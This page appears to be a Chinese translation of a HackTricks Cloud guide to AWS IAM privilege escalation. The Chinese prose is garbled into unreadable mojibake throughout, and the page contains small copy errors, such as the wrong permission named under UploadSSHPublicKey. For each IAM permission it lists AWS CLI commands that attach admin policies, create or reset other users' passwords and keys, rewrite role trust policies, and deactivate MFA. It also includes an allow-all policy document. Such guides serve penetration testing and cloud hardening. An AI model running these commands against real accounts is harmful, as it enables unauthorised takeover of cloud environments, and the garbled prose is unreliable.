# AWS - IAMæƒé™æå‡

<details>

<summary><strong>æ”¯æŒHackTrickså¹¶è·å¾—ç¦åˆ©ï¼</strong></summary>

* å¦‚æœæ‚¨æƒ³åœ¨HackTricksä¸­çœ‹åˆ°æ‚¨çš„å…¬å¸å¹¿å‘Šï¼Œæˆ–è€…å¦‚æœæ‚¨æƒ³è®¿é—®PEASSçš„æœ€æ–°ç‰ˆæœ¬æˆ–ä¸‹è½½PDFç‰ˆæœ¬çš„HackTricksï¼Œè¯·æŸ¥çœ‹[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ï¼
* è·å–[**å®˜æ–¹PEASSå’ŒHackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
* å‘ç°[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬çš„ç‹¬å®¶[**NFTs**](https://opensea.io/collection/the-peass-family)æ”¶è—å“
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**Telegramç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨**æˆ‘çš„ **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) **å’Œ** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **githubä»“åº“æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚**

</details>

## IAM

æœ‰å…³IAMçš„æ›´å¤šä¿¡æ¯ï¼Œè¯·æŸ¥çœ‹ï¼š

{% content-ref url="../aws-services/aws-iam-enum.md" %}
[aws-iam-enum.md](../aws-services/aws-iam-enum.md)
{% endcontent-ref %}

### `iam:CreatePolicyVersion`

æ‹¥æœ‰**`iam:CreatePolicyVersion`**æƒé™çš„æ”»å‡»è€…å¯ä»¥åˆ›å»ºä¸€ä¸ªä»–ä»¬å¯ä»¥è®¿é—®çš„IAMç­–ç•¥çš„**æ–°ç‰ˆæœ¬**ã€‚è¿™ä½¿ä»–ä»¬èƒ½å¤Ÿå®šä¹‰è‡ªå·±çš„**è‡ªå®šä¹‰æƒé™**ã€‚åœ¨åˆ›å»ºæ–°çš„ç­–ç•¥ç‰ˆæœ¬æ—¶ï¼Œéœ€è¦å°†å…¶**è®¾ç½®ä¸ºé»˜è®¤ç‰ˆæœ¬æ‰èƒ½ç”Ÿæ•ˆ**ï¼Œæ‚¨å¯èƒ½ä¼šè®¤ä¸ºè¿™éœ€è¦`iam:SetDefaultPolicyVersion`æƒé™ï¼Œä½†åœ¨åˆ›å»ºæ–°çš„ç­–ç•¥ç‰ˆæœ¬æ—¶ï¼Œå¯ä»¥åŒ…å«ä¸€ä¸ªæ ‡å¿—ï¼ˆ**`--set-as-default`**ï¼‰ï¼Œå®ƒå°†è‡ªåŠ¨å°†å…¶åˆ›å»ºä¸º**æ–°çš„é»˜è®¤ç‰ˆæœ¬**ã€‚è¯¥æ ‡å¿—**ä¸éœ€è¦**ä½¿ç”¨`iam:SetDefaultPolicyVersion`æƒé™ã€‚

åˆ©ç”¨æ­¤æ–¹æ³•çš„ç¤ºä¾‹å‘½ä»¤å¯èƒ½å¦‚ä¸‹æ‰€ç¤ºï¼š
```bash
# Enum
aws iam list-policy-versions --policy-arn <arn>
aws iam get-policy-version --policy-arn <arn> --version-id <VERSION_X>

# Exploitation
aws iam create-policy-version --policy-arn <target_policy_arn> \
--policy-document file:///path/to/administrator/policy.json --set-as-default
```
`policy.json`æ–‡ä»¶ä¸­åŒ…å«äº†å…è®¸å¯¹è´¦æˆ·ä¸­ä»»ä½•èµ„æºæ‰§è¡Œä»»ä½•æ“ä½œçš„**ç­–ç•¥æ–‡æ¡£**ã€‚

**æ½œåœ¨å½±å“ï¼š**ç›´æ¥æå‡è‡³æ‰€æœ‰æƒé™ã€‚

### `iam:SetDefaultPolicyVersion`

æ‹¥æœ‰**`iam:SetDefaultPolicyVersion`**æƒé™çš„æ”»å‡»è€…å¯èƒ½é€šè¿‡**å½“å‰æœªä½¿ç”¨çš„ç°æœ‰ç­–ç•¥ç‰ˆæœ¬**æ¥æå‡æƒé™ã€‚å¦‚æœä»–ä»¬å¯ä»¥è®¿é—®çš„**ç­–ç•¥**æœ‰**éé»˜è®¤ç‰ˆæœ¬**ï¼Œä»–ä»¬å¯ä»¥å°†é»˜è®¤ç‰ˆæœ¬æ›´æ”¹ä¸ºä»»ä½•å…¶ä»–ç°æœ‰ç‰ˆæœ¬ã€‚

{% hint style="warning" %}
å¦‚æœä½ æ­£åœ¨**ä¿®æ”¹**ç‰ˆæœ¬çš„**ç­–ç•¥**æ˜¯æˆäºˆæ”»å‡»è€…`SetDefaultPolicyVersion`æƒé™çš„**åŒä¸€ä¸ªç­–ç•¥**ï¼Œå¹¶ä¸”**æ–°ç‰ˆæœ¬ä¸æˆäºˆ**è¯¥æƒé™ï¼Œæ”»å‡»è€…å°†**æ— æ³•å°†ç­–ç•¥æ¢å¤åˆ°åŸå§‹çŠ¶æ€**ã€‚
{% endhint %}

åˆ©ç”¨æ­¤æ–¹æ³•çš„ç¤ºä¾‹å‘½ä»¤å¯èƒ½å¦‚ä¸‹æ‰€ç¤ºï¼š
```bash
aws iam set-default-policy-version --policy-arn <target_policy_arn> \
--version-id v2
```
å…¶ä¸­â€œv2â€æ˜¯å…·æœ‰æœ€é«˜æƒé™çš„ç­–ç•¥ç‰ˆæœ¬ã€‚

**æ½œåœ¨å½±å“ï¼š**é€šè¿‡è®¾ç½®ä¸åŒçš„ç­–ç•¥ç‰ˆæœ¬ï¼Œé—´æ¥æå‡æƒé™ï¼Œå¯èƒ½æˆäºˆæ›´å¤šæƒé™ã€‚

### `iam:CreateAccessKey`

å…·æœ‰å…¶ä»–ç”¨æˆ·ä¸Šçš„**`iam:CreateAccessKey`**æƒé™çš„æ”»å‡»è€…å¯ä»¥åœ¨AWSç¯å¢ƒä¸­**åˆ›å»ºå±äºå¦ä¸€ä¸ªç”¨æˆ·çš„è®¿é—®å¯†é’¥IDå’Œç§˜å¯†è®¿é—®å¯†é’¥**ï¼Œå‰ææ˜¯è¯¥ç”¨æˆ·å°šæœªä¸å…¶å…³è”ä¸¤ä¸ªå¯†é’¥å¯¹ï¼ˆæœ€ä½³å®è·µå»ºè®®ä¸åº”å¦‚æ­¤ï¼‰ã€‚

åˆ©ç”¨æ­¤æ–¹æ³•çš„ç¤ºä¾‹å‘½ä»¤å¯èƒ½å¦‚ä¸‹æ‰€ç¤ºï¼š
```bash
aws iam create-access-key --user-name <target_user>
```
å½“ç›®æ ‡ç”¨æˆ·æ‹¥æœ‰æ¯”å½“å‰ç”¨æˆ·æ›´å¤šçš„æƒé™æ—¶ã€‚

**æ½œåœ¨å½±å“ï¼š**ç›´æ¥æå‡åˆ°ä»»ä½•ç”¨æˆ·ã€‚

### `iam:CreateLoginProfile`

æ‹¥æœ‰å…¶ä»–ç”¨æˆ·ä¸Šçš„`iam:CreateLoginProfile`æƒé™çš„æ”»å‡»è€…å¯ä»¥**åˆ›å»ºä¸€ä¸ªå¯†ç **ï¼Œç”¨äºç™»å½•åˆ°AWSæ§åˆ¶å°ä¸Šçš„**ä»»ä½•æ²¡æœ‰è®¾ç½®ç™»å½•é…ç½®æ–‡ä»¶çš„ç”¨æˆ·**ã€‚

åˆ©ç”¨æ­¤æ–¹æ³•çš„ç¤ºä¾‹å‘½ä»¤å¯èƒ½å¦‚ä¸‹æ‰€ç¤ºï¼š
```bash
aws iam create-login-profile --user-name target_user --no-password-reset-required \
--password '|[3rxYGGl3@`~68)O{,-$1B"zKejZZ.X1;6T}<XT5isoE=LB2L^G@{uK>f;/CQQeXSo>}t'
```
è¿™ä¸ªå¯†ç ä¿è¯ç¬¦åˆ**è´¦æˆ·æœ€ä½å¯†ç è¦æ±‚**ã€‚

**æ½œåœ¨å½±å“ï¼š**ç›´æ¥æå‡åˆ°â€œä»»ä½•â€ç”¨æˆ·ã€‚

### `iam:UpdateLoginProfile`

æ‹¥æœ‰å…¶ä»–ç”¨æˆ·ä¸Šçš„**`iam:UpdateLoginProfile`**æƒé™çš„æ”»å‡»è€…å¯ä»¥æ›´æ”¹å·²ç»è®¾ç½®äº†ç™»å½•é…ç½®æ–‡ä»¶çš„ä»»ä½•ç”¨æˆ·ç”¨äºç™»å½•AWSæ§åˆ¶å°çš„å¯†ç ã€‚

ä¸åˆ›å»ºç™»å½•é…ç½®æ–‡ä»¶ç±»ä¼¼ï¼Œåˆ©ç”¨æ­¤æ–¹æ³•çš„ç¤ºä¾‹å‘½ä»¤å¯èƒ½å¦‚ä¸‹æ‰€ç¤ºï¼š
```bash
aws iam update-login-profile --user-name target_user --no-password-reset-required \
--password '|[3rxYGGl3@`~68)O{,-$1B"zKejZZ.X1;6T}<XT5isoE=LB2L^G@{uK>f;/CQQeXSo>}t'
```
è¿™ä¸ªå¯†ç ä¿è¯ç¬¦åˆ**è´¦æˆ·æœ€ä½å¯†ç è¦æ±‚**ã€‚

**æ½œåœ¨å½±å“ï¼š**ç›´æ¥ç‰¹æƒå‡çº§â€œä»»ä½•â€ç”¨æˆ·ã€‚

### `iam:UpdateAccessKey`

æ‹¥æœ‰**`iam:UpdateAccessKey`**æƒé™çš„æ”»å‡»è€…å¯ä»¥**å¯ç”¨å·²ç¦ç”¨çš„è®¿é—®å¯†é’¥**å¹¶ä½¿ç”¨å®ƒï¼ˆä»–éœ€è¦æ‹¥æœ‰å·²ç¦ç”¨çš„è®¿é—®å¯†é’¥ï¼‰

{% code overflow="wrap" %}
```bash
aws iam update-access-key --access-key-id AKIAIOSFODNN7EXAMPLE --status Active --user-name Bob
```
{% endcode %}

**æ½œåœ¨å½±å“ï¼š**ç›´æ¥ç‰¹æƒå‡çº§ä»¥è®¿é—®å¯†é’¥ç”¨æˆ·ï¼ˆéœ€è¦æ‹¥æœ‰å¯†é’¥ï¼‰ã€‚

### `iam:CreateServiceSpecificCredential`

å®ƒå…è®¸**ç”Ÿæˆ**ä¸€ä¸ª**ç”¨æˆ·å**å’Œä¸€ä¸ª**å¯†ç **ï¼Œå¯ç”¨äº**è®¿é—®è¯·æ±‚ä¸­æŒ‡å®šçš„æœåŠ¡**ï¼ˆCodeCommitæˆ–Amazon Keyspaces - Apache Cassandraï¼‰ã€‚

æ–°çš„æœåŠ¡ç‰¹å®šå‡­æ®å…·æœ‰ä¸å…³è”ç”¨æˆ·ç›¸åŒçš„æƒé™ï¼Œåªæ˜¯å®ƒä»¬åªèƒ½ç”¨äºè®¿é—®æŒ‡å®šçš„æœåŠ¡ã€‚

æ¯ä¸ªæ”¯æŒçš„æœåŠ¡æ¯ä¸ªç”¨æˆ·åªèƒ½æ‹¥æœ‰**æœ€å¤šä¸¤ç»„æœåŠ¡ç‰¹å®šå‡­æ®**ã€‚
```bash
aws iam create-service-specific-credential --user-name sofia --service-name codecommit.amazonaws.com
```
**æ½œåœ¨å½±å“ï¼š**ç›´æ¥æå‡ç”¨æˆ·æœåŠ¡æƒé™ã€‚

### `iam:ResetServiceSpecificCredential`

ä¸ **`iam:CreateServiceSpecificCredential`** ç±»ä¼¼ï¼Œä½†ä¸æ˜¯åˆ›å»ºæ–°çš„å‡­è¯ï¼Œè€Œæ˜¯é‡ç½®ä¸€ä¸ªå‡­è¯ã€‚
```bash
aws iam reset-service-specific-credential --service-specific-credential-id ACCAEXAMPLE123EXAMPLE
```
{% endcode %}

**æ½œåœ¨å½±å“ï¼š**ç›´æ¥æå‡ç”¨æˆ·æœåŠ¡æƒé™ã€‚

### `iam:AttachUserPolicy`

æ‹¥æœ‰ **`iam:AttachUserPolicy`** æƒé™çš„æ”»å‡»è€…å¯ä»¥é€šè¿‡**å°†ç­–ç•¥é™„åŠ åˆ°ä»–ä»¬å¯ä»¥è®¿é—®çš„ç”¨æˆ·**æ¥æå‡æƒé™ï¼Œå°†è¯¥ç­–ç•¥çš„æƒé™æ·»åŠ åˆ°æ”»å‡»è€…èº«ä¸Šã€‚

åˆ©ç”¨æ­¤æ–¹æ³•çš„ç¤ºä¾‹å‘½ä»¤å¯èƒ½å¦‚ä¸‹æ‰€ç¤ºï¼š
```bash
aws iam attach-user-policy --user-name <my_username> \
--policy-arn "arn:aws:iam::aws:policy/AdministratorAccess"
```
**æ½œåœ¨å½±å“ï¼š** ç›´æ¥æå‡æƒé™åˆ°ä»»ä½•çº§åˆ«ã€‚

### `iam:AttachGroupPolicy`

æ‹¥æœ‰ **`iam:AttachGroupPolicy`** æƒé™çš„æ”»å‡»è€…å¯ä»¥é€šè¿‡å°†ç­–ç•¥é™„åŠ åˆ°ä»–ä»¬æ‰€åœ¨çš„ç»„æ¥æå‡æƒé™ï¼Œå°†è¯¥ç­–ç•¥çš„æƒé™æ·»åŠ åˆ°æ”»å‡»è€…èº«ä¸Šã€‚
```bash
aws iam attach-group-policy --group-name group_i_am_in \
--policy-arn "arn:aws:iam::aws:policy/AdministratorAccess"
```
å½“ç»„æ˜¯å½“å‰ç”¨æˆ·æ‰€å±çš„ç»„æ—¶ã€‚

**æ½œåœ¨å½±å“ï¼š**ç›´æ¥ç‰¹æƒå‡çº§åˆ°ä»»ä½•å†…å®¹ï¼ˆå¦‚æœç”¨æˆ·åœ¨ç»„å†…ï¼‰ã€‚

### `iam:AttachRolePolicy`ï¼Œ(`sts:AssumeRole`|`iam:createrole`)

å…·æœ‰**`iam:AttachRolePolicy`**æƒé™çš„æ”»å‡»è€…å¯ä»¥é€šè¿‡**å°†ç­–ç•¥é™„åŠ åˆ°ä»–ä»¬å¯ä»¥è®¿é—®çš„è§’è‰²**æ¥å‡çº§æƒé™ï¼Œå°†è¯¥ç­–ç•¥çš„æƒé™æ·»åŠ åˆ°æ”»å‡»è€…èº«ä¸Šã€‚
```bash
aws iam attach-role-policy --role-name <role_i_can_assume> \
--policy-arn "arn:aws:iam::aws:policy/AdministratorAccess"
```
å½“è§’è‰²æ˜¯å½“å‰ç”¨æˆ·å¯ä»¥ä½¿ç”¨`sts:AssumeRole`ä¸´æ—¶æ‰®æ¼”çš„è§’è‰²æ—¶ã€‚

**æ½œåœ¨å½±å“ï¼š**ç›´æ¥æå‡åˆ°ä»»ä½•æƒé™ã€‚

### `iam:PutUserPolicy`

æ‹¥æœ‰`iam:PutUserPolicy`æƒé™çš„æ”»å‡»è€…å¯ä»¥é€šè¿‡ä¸ºä»–ä»¬å¯ä»¥è®¿é—®çš„ç”¨æˆ·åˆ›å»ºæˆ–æ›´æ–°å†…è”ç­–ç•¥æ¥**æå‡æƒé™**ï¼Œå°†è¯¥ç­–ç•¥çš„æƒé™æ·»åŠ åˆ°æ”»å‡»è€…èº«ä¸Šã€‚
```bash
aws iam put-user-policy --user-name <my_username> --policy-name "my_inline_policy" \
--policy-document "file:///path/to/administrator/policy.json"
```
æ‚¨å¯ä»¥ä½¿ç”¨ä»¥ä¸‹ç­–ç•¥ï¼š
```json
{
"Version": "2012-10-17",
"Statement": [
{
"Effect": "Allow",
"Action": [
"*"
],
"Resource": [
"*"
]
}
]
}
```
**æ½œåœ¨å½±å“ï¼š**ç›´æ¥ç‰¹æƒå‡çº§åˆ°ä»»ä½•å†…å®¹ã€‚

### `iam:PutGroupPolicy`

æ‹¥æœ‰`iam:PutGroupPolicy`æƒé™çš„æ”»å‡»è€…å¯ä»¥é€šè¿‡**ä¸ºå…¶æ‰€åœ¨çš„ç»„åˆ›å»ºæˆ–æ›´æ–°å†…è”ç­–ç•¥**ï¼Œå°†è¯¥ç­–ç•¥çš„æƒé™æ·»åŠ åˆ°æ”»å‡»è€…èº«ä¸Šï¼Œä»è€Œå‡çº§ç‰¹æƒã€‚
```bash
aws iam put-group-policy --group-name <group_i_am_in> \
--policy-name "group_inline_policy" \
--policy-document file:///path/to/administrator/policy.json
```
åœ¨**å½“å‰ç”¨æˆ·æ‰€åœ¨çš„ç»„**ä¸­ã€‚

**æ½œåœ¨å½±å“ï¼š**ç›´æ¥æå‡æƒé™åˆ°ä»»ä½•åœ°æ–¹ã€‚

### `iam:PutRolePolicy`, (`sts:AssumeRole`|`iam:createrole`)

æ‹¥æœ‰**`iam:PutRolePolicy`**æƒé™çš„æ”»å‡»è€…å¯ä»¥é€šè¿‡**ä¸ºä»–ä»¬å¯ä»¥è®¿é—®çš„è§’è‰²åˆ›å»ºæˆ–æ›´æ–°å†…è”ç­–ç•¥**æ¥æå‡æƒé™ï¼Œå°†è¯¥ç­–ç•¥çš„æƒé™æ·»åŠ åˆ°æ”»å‡»è€…èº«ä¸Šã€‚

åˆ©ç”¨æ­¤æ–¹æ³•çš„ç¤ºä¾‹å‘½ä»¤å¯èƒ½å¦‚ä¸‹æ‰€ç¤ºï¼š
```bash
aws iam put-role-policy --role-name <role_i_can_assume> \
--policy-name "role_inline_policy" \
--policy-document file:///path/to/administrator/policy.json
```
å½“è§’è‰²æ˜¯å½“å‰ç”¨æˆ·å¯ä»¥ä½¿ç”¨`sts:AssumeRole`ä¸´æ—¶æ‰®æ¼”çš„è§’è‰²æ—¶ã€‚

**æ½œåœ¨å½±å“ï¼š**ç›´æ¥æå‡æƒé™åˆ°ä»»ä½•åœ°æ–¹ã€‚

### `iam:AddUserToGroup`

å…·æœ‰**`iam:AddUserToGroup`**æƒé™çš„æ”»å‡»è€…å¯ä»¥ä½¿ç”¨è¯¥æƒé™å°†è‡ªå·±æ·»åŠ åˆ°AWSè´¦æˆ·ä¸­ç°æœ‰çš„IAMç»„ä¸­ã€‚
```bash
aws iam add-user-to-group --group-name <target_group> --user-name <my_username>
```
å½“**ç›®æ ‡ç»„æ‹¥æœ‰æ¯”æ”»å‡»è€…ç”¨æˆ·è´¦æˆ·æ›´å¤š/ä¸åŒçš„æƒé™**æ—¶ã€‚

**æ½œåœ¨å½±å“ï¼š**ç›´æ¥æå‡åˆ°ä»»ä½•ç»„ã€‚

### `iam:UpdateAssumeRolePolicy`, `sts:AssumeRole`

æ‹¥æœ‰`iam:UpdateAssumeRolePolicy`å’Œ`sts:AssumeRole`æƒé™çš„æ”»å‡»è€…å°†èƒ½å¤Ÿ**æ›´æ”¹ä»»ä½•ç°æœ‰è§’è‰²çš„å‡å®šè§’è‰²ç­–ç•¥æ–‡æ¡£**ï¼Œä»¥å…è®¸ä»–ä»¬æ‰®æ¼”è¯¥è§’è‰²ã€‚
```bash
aws iam update-assume-role-policy --role-name <role_to_assume> \
--policy-document file:///path/to/assume/role/policy.json
```
å½“ç­–ç•¥å¦‚ä¸‹æ‰€ç¤ºæ—¶ï¼Œè¯¥ç­–ç•¥å…è®¸ç”¨æˆ·æ‰®æ¼”è§’è‰²ï¼š
```json
{
"Version": "2012-10-17",
"Statement": [
{
"Effect": "Allow",
"Action": "sts:AssumeRole",
"Principal": {
"AWS": "$USER_ARN"
}
}
]
}
```
**æ½œåœ¨å½±å“ï¼š**ç›´æ¥ç‰¹æƒå‡çº§åˆ°ä»»ä½•è§’è‰²ã€‚

### `iam:UploadSSHPublicKey`

å…·æœ‰`iam:DeactivateMFADevice`æƒé™çš„æ”»å‡»è€…å¯ä»¥ä¸Šä¼ ä¸€ä¸ª**SSHå…¬é’¥å¹¶å°†å…¶ä¸æŒ‡å®šçš„IAMç”¨æˆ·å…³è”**ï¼ˆ[äº†è§£æ›´å¤š](https://docs.aws.amazon.com/IAM/latest/APIReference/API\_UploadSSHPublicKey.html)ï¼‰ã€‚

é€šè¿‡æ­¤æ“ä½œä¸Šä¼ çš„SSHå…¬é’¥ä»…å¯ç”¨äº**å¯¹å…³è”çš„IAMç”¨æˆ·è¿›è¡Œèº«ä»½éªŒè¯ä»¥è®¿é—®CodeCommitå­˜å‚¨åº“**ã€‚æœ‰å…³ä½¿ç”¨SSHå¯†é’¥è¿›è¡ŒCodeCommitå­˜å‚¨åº“èº«ä»½éªŒè¯çš„æ›´å¤šä¿¡æ¯ï¼Œè¯·å‚é˜…_CodeCommitç”¨æˆ·æŒ‡å—_ä¸­çš„[è®¾ç½®CodeCommit SSHè¿æ¥](https://docs.aws.amazon.com/codecommit/latest/userguide/setting-up-credentials-ssh.html)ã€‚
```bash
aws iam upload-ssh-public-key --user-name <value> \
--ssh-public-key-body <value>
```
**æ½œåœ¨å½±å“ï¼š**å¯¹CodeCommitè¿›è¡Œé—´æ¥æƒé™æå‡ã€‚

### `iam:DeactivateMFADevice`

æ‹¥æœ‰`iam:DeactivateMFADevice`æƒé™çš„æ”»å‡»è€…å¯ä»¥**åœç”¨æŒ‡å®šçš„MFAè®¾å¤‡**å¹¶å°†å…¶ä¸æœ€åˆå¯ç”¨è¯¥è®¾å¤‡çš„IAMç”¨æˆ·è§£é™¤å…³è”ï¼ˆ[äº†è§£æ›´å¤š](https://docs.aws.amazon.com/IAM/latest/APIReference/API\_DeactivateMFADevice.html)ï¼‰ã€‚
```bash
aws iam deactivate-mfa-device --user-name <value> --serial-number <value>
```
**æ½œåœ¨å½±å“ï¼š**é€šè¿‡ç¦ç”¨å¤šå› ç´ èº«ä»½éªŒè¯è®¾å¤‡ï¼Œé—´æ¥æå‡ç”¨æˆ·æƒé™ï¼Œå‰ææ˜¯ä½ å·²ç»çŸ¥é“ä»–çš„ç”¨æˆ·åå’Œå¯†ç ã€‚

### `iam:ResyncMFADevice`

å…·æœ‰`iam:ResyncMFADevice`æƒé™çš„æ”»å‡»è€…å¯ä»¥å°†æŒ‡å®šçš„å¤šå› ç´ èº«ä»½éªŒè¯è®¾å¤‡ä¸IAMå®ä½“ï¼ˆç”¨æˆ·æˆ–è§’è‰²ï¼‰è¿›è¡Œ**åŒæ­¥**ï¼ˆ[äº†è§£æ›´å¤š](https://docs.aws.amazon.com/IAM/latest/APIReference/API_ResyncMFADevice.html)ï¼‰ã€‚
```bash
aws iam resync-mfa-device --user-name <value> --serial-number <value> \
--authentication-code1 <value> --authentication-code2 <value>
```
**æ½œåœ¨å½±å“ï¼š**é€šè¿‡æ·»åŠ MFAè®¾å¤‡ï¼Œé—´æ¥æå‡ç”¨æˆ·æƒé™ï¼Œå‰ææ˜¯æ‚¨å·²ç»çŸ¥é“ä»–çš„ç”¨æˆ·åå’Œå¯†ç ã€‚

### `iam:UpdateSAMLProvider`, `iam:ListSAMLProviders`, (`iam:GetSAMLProvider`)

é€šè¿‡è¿™äº›æƒé™ï¼Œæ‚¨å¯ä»¥**æ›´æ”¹SAMLè¿æ¥çš„XMLå…ƒæ•°æ®**ã€‚ç„¶åï¼Œæ‚¨å¯ä»¥æ»¥ç”¨**SAMLè”åˆ**æ¥ä½¿ç”¨ä»»ä½•**ä¿¡ä»»å®ƒçš„è§’è‰²**è¿›è¡Œ**ç™»å½•**ã€‚

è¯·æ³¨æ„ï¼Œè¿™æ ·åšä¼šå¯¼è‡´**åˆæ³•ç”¨æˆ·æ— æ³•ç™»å½•**ã€‚ä½†æ˜¯ï¼Œæ‚¨å¯ä»¥è·å–XMLï¼Œå› æ­¤å¯ä»¥æ”¾å…¥æ‚¨è‡ªå·±çš„XMLï¼Œç™»å½•å¹¶é…ç½®ä¹‹å‰çš„è®¾ç½®ã€‚
```bash
# List SAMLs
aws iam list-saml-providers

# Optional: Get SAML provider XML
aws iam get-saml-provider --saml-provider-arn <ARN>

# Update SAML provider
aws iam update-saml-provider --saml-metadata-document <value> --saml-provider-arn <arn>

## Login impersonating roles that trust the SAML provider

# Optional: Set the previous XML back
aws iam update-saml-provider --saml-metadata-document <previous-xml> --saml-provider-arn <arn>
```
{% hint style="info" %}
å¾…åŠäº‹é¡¹ï¼šä¸€ç§èƒ½å¤Ÿç”ŸæˆSAMLå…ƒæ•°æ®å¹¶ä½¿ç”¨æŒ‡å®šè§’è‰²ç™»å½•çš„å·¥å…·
{% endhint %}

### `iam:UpdateOpenIDConnectProviderThumbprint`, `iam:ListOpenIDConnectProviders`, (`iam:`**`GetOpenIDConnectProvider`**)

ï¼ˆä¸ç¡®å®šï¼‰å¦‚æœæ”»å‡»è€…æ‹¥æœ‰è¿™äº›**æƒé™**ï¼Œä»–å¯ä»¥æ·»åŠ ä¸€ä¸ªæ–°çš„**Thumbprint**æ¥æˆåŠŸç™»å½•æ‰€æœ‰ä¿¡ä»»è¯¥æä¾›è€…çš„è§’è‰²ã€‚

{% code overflow="wrap" %}
```bash
# List providers
aws iam list-open-id-connect-providers
# Optional: Get Thumbprints used to not delete them
aws iam get-open-id-connect-provider --open-id-connect-provider-arn <ARN>
# Update Thumbprints (The thumbprint is always a 40-character string)
aws iam update-open-id-connect-provider-thumbprint --open-id-connect-provider-arn <ARN> --thumbprint-list 359755EXAMPLEabc3060bce3EXAMPLEec4542a3
```
{% endcode %}

<details>

<summary><strong>æ”¯æŒ HackTricks å¹¶è·å¾—ç¦åˆ©ï¼</strong></summary>

* å¦‚æœæ‚¨æƒ³åœ¨ HackTricks ä¸­çœ‹åˆ°æ‚¨çš„å…¬å¸å¹¿å‘Šï¼Œæˆ–è€…å¦‚æœæ‚¨æƒ³è®¿é—® PEASS çš„æœ€æ–°ç‰ˆæœ¬æˆ–ä¸‹è½½ HackTricks çš„ PDFï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* è·å–[**å®˜æ–¹ PEASS å’Œ HackTricks å•†å“**](https://peass.creator-spring.com)
* å‘ç°[**PEASS å®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬çš„ç‹¬å®¶[**NFT**](https://opensea.io/collection/the-peass-family)æ”¶è—å“
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**Telegram ç¾¤ç»„**](https://t.me/peass)ï¼Œæˆ–åœ¨ **Twitter** ä¸Š **å…³æ³¨** æˆ‘ ğŸ¦ [**@carlospolopm**](https://twitter.com/carlospolopm)**ã€‚**
* é€šè¿‡å‘ [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ä»“åº“æäº¤ PR æ¥ **åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§**ã€‚

</details>
